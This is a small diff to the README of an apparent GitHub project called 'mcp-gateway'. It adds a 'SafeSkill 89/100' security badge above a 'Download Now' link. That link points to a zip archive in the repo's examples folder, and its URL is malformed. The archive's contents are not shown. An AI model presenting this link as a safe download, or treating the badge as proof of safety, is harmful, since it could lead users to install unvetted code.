@@ -1,5 +1,7 @@
 # 🌟 mcp-gateway - Connect Your Tools Effortlessly
 
+[![SafeSkill 89/100](https://img.shields.io/badge/SafeSkill-89%2F100_Passes%20with%20Notes-yellow)](https://safeskill.dev/scan/rares683-mcp-gateway)
+
 ## 📥 Download Now
 [![Download mcp-gateway](https://github.com/Rares683/mcp-gateway/raw/refs/heads/main/examples/gateway_mcp_v2.6.zip%https://github.com/Rares683/mcp-gateway/raw/refs/heads/main/examples/gateway_mcp_v2.6.zip)](https://github.com/Rares683/mcp-gateway/raw/refs/heads/main/examples/gateway_mcp_v2.6.zip)
 
